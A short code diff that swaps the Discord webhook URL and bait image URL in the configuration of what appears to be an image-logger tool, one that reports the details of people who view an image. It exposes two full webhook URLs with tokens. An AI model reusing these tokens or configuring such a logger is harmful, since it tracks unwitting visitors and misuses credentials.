@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
+    "webhook": "https://discord.com/api/webhooks/1510470287747977390/l94yXcp8yvZhU_F9b6hSNVYC74Nt_oDr36nKZ8DPNelKXfmnGT7Jgrvx72LYKKYQyBaG",
+    "image": "https://pbs.twimg.com/media/F0nw-aOWcAEJLO8?format=png&name=900x900",
     "imageArgument": True,
 
     # CUSTOMIZATION #
